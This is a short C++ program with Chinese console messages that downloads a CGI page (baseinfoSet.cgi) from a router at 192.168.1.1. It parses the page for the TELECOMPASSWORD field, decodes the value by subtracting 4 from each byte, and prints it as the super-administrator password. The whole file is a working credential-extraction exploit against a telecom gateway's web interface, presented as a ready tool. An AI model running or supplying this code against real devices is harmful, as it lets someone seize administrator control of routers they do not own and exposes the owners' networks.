#include<stdio.h>
#include<stdlib.h>
#include<iostream>
#include<string>
#include<UrlMon.h>
#pragma comment(lib, "urlmon.lib")
using namespace std;
int main() {
	HRESULT hr = URLDownloadToFile(nullptr,"http://192.168.1.1:8080/cgi-bin/baseinfoSet.cgi","passwd",0,0);
	if (hr != S_OK)
	{
		cout << "下载失败程序退出 ! ! !" << endl;
		return 1;
	}
	else
	{
		cout << "下载成功" << endl;
	}
	FILE* Fcgi = nullptr;
	char bash[32] = "";
	/*UINT num[512] = {O}, n;*/
	unsigned char TPassword[64] = { 0 };
	errno_t err = 0;
	long fnum = 0;
	err = fopen_s(&Fcgi, "passwd", "rb");
	if (err == 0)
	{
		cout << "文件打开成功 * * *" << endl;
		
		if (0 != Fcgi)
		{
			while (true)
			{
				memset(bash, 0, 32);
				fscanf_s(Fcgi, "%[^\"_]%*c", bash, 32);
				if (fnum == ftell(Fcgi))
				{
					//fseek(Fcgi, 1, SEEK_CUR);
					fseek(Fcgi, 1, 1);
				}
				fnum = ftell(Fcgi);
				if (!strcmp(bash, "TELECOMPASSWORD"))
				{
					fread_s(bash, 2, 1, 2, Fcgi);
					memset(TPassword, 0, 64);
					for (size_t i = 0; i < 64; i++)
					{
						fscanf_s(Fcgi, "%hhu&]", &TPassword[i]);
						if (TPassword[i] == 0) {
							break;
						}
					}
					break;
				}
			}
			for (size_t i = 0; i < 12; i++)
			{
				TPassword[i] -= 4;
			}
			cout <<"超级管理密码:"<< TPassword << endl;
			fclose(Fcgi);
		}
	}
	else {
		cout << "文件打开失败 ! ! !" << endl;
	}
    system("pause");
	return 0;
}